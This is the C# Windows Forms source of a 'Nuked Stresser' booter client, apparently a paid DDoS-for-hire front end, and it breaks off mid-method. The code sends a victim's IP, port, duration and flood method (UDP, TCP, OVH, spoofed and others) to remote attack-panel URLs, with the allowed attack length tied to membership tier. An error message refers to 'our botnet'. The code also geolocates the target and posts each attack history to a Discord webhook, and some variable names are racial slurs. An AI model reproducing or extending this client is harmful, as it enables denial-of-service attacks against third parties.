using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Shadow_Stresser;

namespace NukedStresser
{    
    public partial class Form1 : Form
    {
        public static string iptext;
        public Form1()
        {
            InitializeComponent();
        }
       
        private void label2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private async void progbar99()
        {
            bunifuCircleProgressbar1.Value = 99;
            bunifuCircleProgressbar1.Update();
            bunifuThinButton21.Text = "Running...";
            bunifuThinButton21.Update();
            //bunifuThinButton21.Enabled = false;
            bunifuThinButton21.Text = "Running...";
            await Task.Delay(logInTrackBar1.Value * 1000);
            progbar10();
        }

        private async void progbar10()
        {
            bunifuCircleProgressbar1.Value = 10;
            bunifuCircleProgressbar1.Update();
            bunifuThinButton21.Text = "Attack";
            bunifuThinButton21.Update();
            bunifuThinButton21.Enabled = true;
        }

        public static void sendWebHook(string URL, string msg, string username)
        {
            Http.Post(URL, new NameValueCollection()
        {
            {
                "username",
                username
            },
            {
                "content",
                msg
            }
        });
        }
        
        string test;
        WebClient wc = new WebClient();
        private void bunifuThinButton21_Click(object sender, EventArgs e)
        {
            attkdisabled disallowattk = new attkdisabled();
            if (bunifuCircleProgressbar1.Value == 99)
            {
                disallowattk.Show();
            }
            else
            {
                if (test == "Rookie")
                {
                    if (Convert.ToInt32(logInTrackBar1.Value) > 300)
                    {
                        MessageBox.Show("Duration Exceeded ! \n Your Max Boot Time Is 300 Seconds", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    else
                    {
                        if (logInComboBox1.SelectedIndex == 5 || logInComboBox1.SelectedIndex == 6 || logInComboBox1.SelectedIndex == 7 || logInComboBox1.SelectedIndex == 8 || logInComboBox1.SelectedIndex == 9 || logInComboBox1.SelectedIndex == 10 || logInComboBox1.SelectedIndex == 11 || logInComboBox1.SelectedIndex == 12 || logInComboBox1.SelectedIndex == 13 || logInComboBox1.SelectedIndex == 14 || logInComboBox1.SelectedIndex == 15 || logInComboBox1.SelectedIndex == 16 || logInComboBox1.SelectedIndex == 17 || logInComboBox1.SelectedIndex == 18 || logInComboBox1.SelectedIndex == 19 || logInComboBox1.SelectedIndex == 20 || logInComboBox1.SelectedIndex == 21 || logInComboBox1.SelectedIndex == 22)
                        {
                            MessageBox.Show("Please Upgrade Your MemberShip To Access VIP Methods", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                        else
                        {
                            sendattack();
                        }
                    }
                }
                else if (test == "Semi-Pro")
                {
                    if (Convert.ToInt32(logInTrackBar1.Value) > 600)
                    {
                        MessageBox.Show("Duration Exceeded ! \n Your Max Boot Time Is 600 Seconds", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    else
                    {
                        if (logInComboBox1.SelectedIndex == 5 || logInComboBox1.SelectedIndex == 6 || logInComboBox1.SelectedIndex == 7 || logInComboBox1.SelectedIndex == 8 || logInComboBox1.SelectedIndex == 9 || logInComboBox1.SelectedIndex == 10 || logInComboBox1.SelectedIndex == 11 || logInComboBox1.SelectedIndex == 12 || logInComboBox1.SelectedIndex == 13 || logInComboBox1.SelectedIndex == 14 || logInComboBox1.SelectedIndex == 15 || logInComboBox1.SelectedIndex == 16 || logInComboBox1.SelectedIndex == 17 || logInComboBox1.SelectedIndex == 18 || logInComboBox1.SelectedIndex == 19 || logInComboBox1.SelectedIndex == 20 || logInComboBox1.SelectedIndex == 21 || logInComboBox1.SelectedIndex == 22)
                        {
                            MessageBox.Show("Please Upgrade Your MemberShip To Access VIP Methods", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                        else
                        {
                            sendattack();
                        }
                    }
                }
                else if (test == "Pro")
                {
                    if (Convert.ToInt32(logInTrackBar1.Value) > 900)
                    {
                        MessageBox.Show("Duration Exceeded ! \n Your Max Boot Time Is 900 Seconds", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    else
                    {
                        if (logInComboBox1.SelectedIndex == 5 || logInComboBox1.SelectedIndex == 6 || logInComboBox1.SelectedIndex == 7 || logInComboBox1.SelectedIndex == 8 || logInComboBox1.SelectedIndex == 9 || logInComboBox1.SelectedIndex == 10 || logInComboBox1.SelectedIndex == 11 || logInComboBox1.SelectedIndex == 12 || logInComboBox1.SelectedIndex == 13 || logInComboBox1.SelectedIndex == 14 || logInComboBox1.SelectedIndex == 15 || logInComboBox1.SelectedIndex == 16 || logInComboBox1.SelectedIndex == 17 || logInComboBox1.SelectedIndex == 18 || logInComboBox1.SelectedIndex == 19 || logInComboBox1.SelectedIndex == 20 || logInComboBox1.SelectedIndex == 21 || logInComboBox1.SelectedIndex == 22)
                        {
                            MessageBox.Show("Please Upgrade Your MemberShip To Access VIP Methods", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                        else
                        {
                            sendattack();
                        }
                    }
                }
                else if (test == "VIP") // Premium > No method restriction
                {
                    if (Convert.ToInt32(logInTrackBar1.Value) > 1200)
                    {
                        MessageBox.Show("Duration Exceeded ! \n Your Max Boot Time Is 1200", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    else
                    {
                        sendattack();
                    }
                }
                else if (test == "Fucking SLAM GOD") // Premium > No method restriction
                {
                    if (Convert.ToInt32(logInTrackBar1.Value) > 1000)
                    {
                        MessageBox.Show("Duration Exceeded ! \n Your Max Boot Time Is 1000", "Oops...", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    else
                    {
                        sendattack();
                    }
                }
                else if (test == "")
                {
                    MessageBox.Show("Who are you ? We are unable to verify your membership so with that said, you are not allowed to send an attack.", "Error, Unknown user", MessageBoxButtons.OK, MessageBoxIcon.Error); Environment.Exit(0);
                }
            }            
        }

        private void sendattack()
        {
            msgbox gg = new msgbox();            
            if (host.Text == "0.0.0.0" || host.Text == "0.0.0.0" || host.Text == "0.0.0.0" || host.Text == "0.0.0.0")  //BlackList
            {
                MessageBox.Show("IP is blacklisted !", "Error", MessageBoxButtons.OK);
            }
            else
            {
                History.Clear();
                try
                {
                    string[] methods;
                    methods = new string[43] {"-Regular Plans-", //0
                
                "ACK",           //0
                "TCP",            //0
                "UDP",             //0
                "GAME",              //0
                "-Vip Plans-",              //0
                "OVH",   //0
                "NFO",             //0
                "HEX",            //0 
                "VSEV",           //0
                "XMAS",          //0
                "DROP",      //0
                "STDV",        //0
                "KILL",        //0
                "UDPV",     //0
                "TCPV",     //0
                "TCPV",  //0
                "FN",   //0
                "FNv2",  //0
                "GAMEv2", //0
                "XXX",       //20
                "XXX",       //21
                "XXX",       //22
                "XXX",       //23
                "XXX",      //24
                "XXX",     //25
                "xxx",   //26
                "xxx",   //27
                "xxx",  //28
                "xxx",     //29
                "xxx",    //30
                "xxx",  //31
                "xxx",  //32
                "xxx",  //33
                "xxx",  //34
                ">SPOOF-VIP-NetWork<",   //0
                "xxx",  //36
                "xxx",  //37
                "xxx", //38
                "xxx", //39
                "xxx",   //40
                "xxx",  //41
                "xxx",  //42

                };

                    if (logInComboBox1.SelectedIndex == 0)
                    {
                        MessageBox.Show("Select a valid method", "Nuked Stresser");
                    }
                    if (logInComboBox1.SelectedIndex == 0)
                    {
                        wc.DownloadString("" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[0]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        MessageBox.Show("Select a valid method", "Nuked Stresser");
                    }
                    else if (logInComboBox1.SelectedIndex == 1)
                    {
                        wc.DownloadString("http://0.0.0.0/panel.php?key=shdf90sudf09sudf&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[1]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 2)
                    {
                        wc.DownloadString("http://0.0.0.0/panel.php?key=shdf90sudf09sudf&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[2]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 3)
                    {
                        wc.DownloadString("http://0.0.0.0/panel.php?key=shdf90sudf09sudf&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[3]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 4)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[4]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 5)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[5]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        MessageBox.Show("Select a valid method", "Nuked Stresser");
                    }
                    else if (logInComboBox1.SelectedIndex == 6)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[6]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 7)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[7]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 8)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[8]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 9)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[9]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();

                    }
                    else if (logInComboBox1.SelectedIndex == 10)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[10]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 11)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[11]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 12)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[12]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 13)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[13]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 14)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[14]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 15)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[15]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 16)
                    {
                        wc.DownloadString("http://0.0.0.0/panelvip.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[16]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 17)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[17]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 18)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[18]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 19)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[19]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 20)
                    {
                        wc.DownloadString("http://0.0.0.0/DEDI6.php?key=3twVN3VW8Y0HAU4Mh03icbUP&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[20]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 21)
                    {
                        wc.DownloadString("http://0.0.0.0/DEDI6.php?key=3twVN3VW8Y0HAU4Mh03icbUP&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[21]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 22)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[22]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 23)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[23]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 24)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[24]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 25)
                    {
                        wc.DownloadString("http://0.0.0.0/test.php?key=KEYX&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[25]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 26)
                    {
                        wc.DownloadString("http://0.0.0.0host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[26]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 27)
                    {
                        wc.DownloadString("http://0.0.0.0host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[27]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 28)
                    {
                        wc.DownloadString("http://0.0.0.0host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[28]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 29)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[29]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 30)
                    {
                        wc.DownloadString("http://host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[30]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 31)
                    {
                        wc.DownloadString("http:/&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[31]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 32)
                    {
                        wc.DownloadString("http:/&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[32]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 33)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[33]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 34)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[34]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 35)
                    {
                        wc.DownloadString("" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[35]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 36)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[36]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 37)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[37]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 38)
                    {
                        wc.DownloadString("http://s&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[38]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 39)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[39]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 40)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[40]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 41)
                    {
                        wc.DownloadString("http:/&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[41]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                    else if (logInComboBox1.SelectedIndex == 42)
                    {
                        wc.DownloadString("http://&host=" + host.Text + "&port=" + port.Text + "&time=" + logInTrackBar1.Value + "&method=" + methods[42]);
                        History.AppendText("IP Address : " + host.Text + "\n" + "Port : " + port.Text + "\n" + "Time : " + logInTrackBar1.Value + "\n" + "Method : " + logInComboBox1.SelectedItem);
                        
                        gg.Show();
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("Unable to send attack\n Reasons why this showed up...\n 1. API Server may be down.\n 2. Our botnet may be down\n 3. You have no internet connection lol.", "Error");
                }
                progbar99();
                sendWebHook("https://discordapp.com/api/webhooks", History.Text, TrinitySeal.UserInfo.Username);
            }
        }

        private void bunifuThinButton22_Click(object sender, EventArgs e)
        {
            string text = host.Text;

            string arguments = "/k ping -t " + text;
            Process.Start("CMD.exe", arguments);
        }
        
        private void lookupthisbitch()
        {
            try
            {
                if (host.Text == "")
                {
                    MessageBox.Show("Please input an IP in the IP textbox", "Error");
                }
                else
                {
                    string hostname = wc.DownloadString("http://ip-api.com/line/" + host.Text + "?fields=4096");
                    string isp = wc.DownloadString("http://ip-api.com/line/" + host.Text + "?fields=512");
                    string country = wc.DownloadString("http://ip-api.com/line/" + host.Text + "?fields=1");
                    string state = wc.DownloadString("http://ip-api.com/line/" + host.Text + "?fields=8");
                    string city = wc.DownloadString("http://ip-api.com/line/" + host.Text + "?fields=16");
                    MessageBox.Show("IP : " + host.Text + "\n" + "\n" + "Hostname : " + hostname + "\n" + "ISP : " + isp + "\n" + "Country : " + country + "\n" + "State : " + state + "\n" + "City : " + city);
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Unable to resolve info !\n" + "Are you disconnected from internet?");
            }
        }

        private void bunifuThinButton23_Click(object sender, EventArgs e)
        {
            iptext = host.Text;
            iplookup lookup = new iplookup();
            lookup.Show();
        }

        private void bunifuThinButton24_Click(object sender, EventArgs e)
        {
            richTextBox3.Text = "";
            richTextBox3.Update();
            WebClient wc = new WebClient { }; string portscan =
            wc.DownloadString("https:///?q=" + host.Text);
            richTextBox3.Text = (portscan);
        }
 
        private void Form1_Load(object sender, EventArgs e)
        {
            
            label7.Text = TrinitySeal.ProgramVariables.Clients + " Total users";
            if (TrinitySeal.UserInfo.Level == 1)
            {
                test = "Rookie".ToString();
                logInTrackBar1.Maximum = 200;
            }
            else if (TrinitySeal.UserInfo.Level == 2)
            {
                test = "Semi-Pro".ToString();
                logInTrackBar1.Maximum = 400;
            }
            else if (TrinitySeal.UserInfo.Level == 3)
            {
                test = "Pro".ToString();
                logInTrackBar1.Maximum = 600;
            }
            else if (TrinitySeal.UserInfo.Level == 4)
            {
                test = "Legend".ToString();
                logInTrackBar1.Maximum = 800;
            }
            else if (TrinitySeal.UserInfo.Level == 10)
            {
                test = "Fucking SLAM GOD".ToString();
                logInTrackBar1.Maximum = 1200;
            }
            var fuck = "https://apirg/";
            var you = (HttpWebRequest)WebRequest.Create(fuck);
            var bitch = (HttpWebResponse)you.GetResponse();
            var ass = bitch.GetResponseStream();
            var nigga = new StreamReader(ass);
            nigga.ReadToEnd();
            label9.Text = nigga.ReadToEnd();
            string hostname = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=4096");
            string isp = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=512");
            string country = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=1");
            string state = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=8");
            string city = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=16");
            richTextBox2.Text = "Account Expiry -> " + TrinitySeal.UserInfo.Expires + "\n" + "\n" + "Username -> " + TrinitySeal.UserInfo.Username + "\n" + "\n" + "Email -> " + TrinitySeal.UserInfo.Email + "\n" + "\n" + "Account Level -> " + TrinitySeal.UserInfo.Level + "\n" + "\n" + "Membership Type -> " + test + "\n" + "\n" + "Registered IP -> " + TrinitySeal.UserInfo.IP + "\n" + "\n" + "Hostname -> " + hostname + "\n" + "ISP -> " + isp + "\n" + "Country -> " + country + "\n" + "State -> " + state + "\n" + "City -> " + city; ;

        }

        private void bunifuThinButton25_Click(object sender, EventArgs e)
        {
            Clipboard.Clear();
            Clipboard.SetText(History.Text);
        }

        private void bunifuThinButton26_Click(object sender, EventArgs e)
        {
            Clipboard.Clear();
            Clipboard.SetText(richTextBox2.Text);
        }

        private void bunifuThinButton27_Click(object sender, EventArgs e)
        {
            Clipboard.Clear();
            Clipboard.SetText(richTextBox3.Text);
        }

        private void host_OnValueChanged(object sender, EventArgs e)
        {

        }

        private void host_Enter(object sender, EventArgs e)
        {
            if (host.Text == "IP")
            {
                host.Text = "";
                host.ForeColor = Color.Yellow;
            }
        }

        private void host_Leave(object sender, EventArgs e)
        {
            if (host.Text == "")
            {
